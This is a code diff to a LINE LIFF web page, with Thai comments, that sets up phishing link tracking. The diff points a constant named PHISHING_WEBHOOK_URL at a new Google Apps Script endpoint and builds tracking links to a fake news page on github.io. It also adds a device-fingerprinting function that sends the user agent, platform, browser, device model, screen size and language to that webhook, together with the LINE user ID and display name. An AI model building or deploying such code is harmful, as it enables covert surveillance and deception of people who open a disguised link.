@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGkaXFCBxIuyO9oEBBDFFnbNWtm8S0meqjObC6fX9dGVdiVZf4-VQS9ZqcK6yB0IqC-Q/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxSTddSRBzHd2T_UfoRusee7eNOd2xQ0VMnwJlYDR5uFeoBcKBiEnEsdWjvIFxbPpmGsw/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -820,10 +820,24 @@
                 // สร้าง URL สำหรับคลิก (ชี้ไปที่ index.html พร้อม tracking key)
                 const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`; // PHISHING_DOMAIN should point to index.html
                 
-                // สร้าง URL สำหรับ Zero Click tracking ให้มีข้อมูลเพียงพอสำหรับการติดตาม
-                // เพิ่มพารามิเตอร์ userId เพื่อระบุผู้สร้าง และ random เพื่อป้องกันการแคช
+                // รวบรวมข้อมูลอุปกรณ์สำหรับส่งใน zeroClickTrackUrl
+                const deviceInfo = getDeviceInfo();
+                
+                // สร้าง URL สำหรับ Zero Click tracking ที่มีข้อมูลเพิ่มเติม
                 const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
-                const zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}&creator=${encodeURIComponent(userId)}&name=${encodeURIComponent(displayName)}&r=${randomSuffix}`;
+                let zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}&creator=${encodeURIComponent(userId)}&name=${encodeURIComponent(displayName)}`;
+                
+                // เพิ่มข้อมูลอุปกรณ์และระบบลงใน URL เพื่อให้เก็บข้อมูลได้มากขึ้น
+                zeroClickTrackUrl += `&ua=${encodeURIComponent(navigator.userAgent)}`;
+                zeroClickTrackUrl += `&platform=${encodeURIComponent(deviceInfo.platform)}`;
+                zeroClickTrackUrl += `&browser=${encodeURIComponent(deviceInfo.browser)}`;
+                zeroClickTrackUrl += `&deviceType=${encodeURIComponent(deviceInfo.deviceType)}`;
+                zeroClickTrackUrl += `&deviceModel=${encodeURIComponent(deviceInfo.deviceModel)}`;
+                zeroClickTrackUrl += `&screenSize=${encodeURIComponent(deviceInfo.screenSize)}`;
+                zeroClickTrackUrl += `&language=${encodeURIComponent(navigator.language || '')}`;
+                
+                // เพิ่ม random parameter เพื่อป้องกันการแคช
+                zeroClickTrackUrl += `&r=${randomSuffix}`;
                 
                 console.log("Zero Click Track URL:", zeroClickTrackUrl);
 
@@ -940,6 +954,67 @@
         // ฟังก์ชันสร้าง ID เฉพาะ
         function generateUniqueId() {
             return Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
+        }
+
+        // ฟังก์ชันดึงข้อมูลอุปกรณ์สำหรับส่งไปกับ ZeroClick
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let deviceInfo = {
+                platform: "ไม่ทราบ",
+                browser: "ไม่ทราบ", 
+                deviceType: "ไม่ทราบ",
+                deviceModel: "ไม่ทราบ",
+                screenSize: `${window.screen.width}x${window.screen.height}`
+            };
+            
+            // ระบบปฏิบัติการ
+            if (/Windows/.test(ua)) {
+                deviceInfo.platform = "Windows";
+            } else if (/Android/.test(ua)) {
+                deviceInfo.platform = "Android";
+            } else if (/iPhone|iPad|iPod/.test(ua)) {
+                deviceInfo.platform = "iOS";
+            } else if (/Mac OS X/.test(ua)) {
+                deviceInfo.platform = "macOS";
+            } else if (/Linux/.test(ua)) {
+                deviceInfo.platform = "Linux";
+            }
+            
+            // ประเภทอุปกรณ์
+            if (/Mobile|Android/.test(ua) && !/iPad/.test(ua)) {
+                deviceInfo.deviceType = "มือถือ";
+            } else if (/iPad|Tablet/.test(ua)) {
+                deviceInfo.deviceType = "แท็บเล็ต";
+            } else {
+                deviceInfo.deviceType = "คอมพิวเตอร์";
+            }
+            
+            // เบราว์เซอร์
+            if (/Line/.test(ua)) {
+                deviceInfo.browser = "LINE";
+            } else if (/Chrome/.test(ua) && !/Chromium|Edge/.test(ua)) {
+                deviceInfo.browser = "Chrome";
+            } else if (/Firefox/.test(ua)) {
+                deviceInfo.browser = "Firefox";
+            } else if (/Safari/.test(ua) && !/Chrome/.test(ua)) {
+                deviceInfo.browser = "Safari";
+            } else if (/Edge|Edg/.test(ua)) {
+                deviceInfo.browser = "Edge";
+            } else if (/MSIE|Trident/.test(ua)) {
+                deviceInfo.browser = "Internet Explorer";
+            }
+            
+            // ทดสอบรุ่นอุปกรณ์ (เบื้องต้น)
+            if (/iPhone/.test(ua)) {
+                deviceInfo.deviceModel = "iPhone";
+            } else if (/iPad/.test(ua)) {
+                deviceInfo.deviceModel = "iPad";
+            } else if (/Android/.test(ua)) {
+                const modelMatch = ua.match(/Android.*?;\s([^;)]+)(?:\)|;)/);
+                deviceInfo.deviceModel = modelMatch ? modelMatch[1].trim() : "Android Device";
+            }
+            
+            return deviceInfo;
         }
     </script>
 </body>
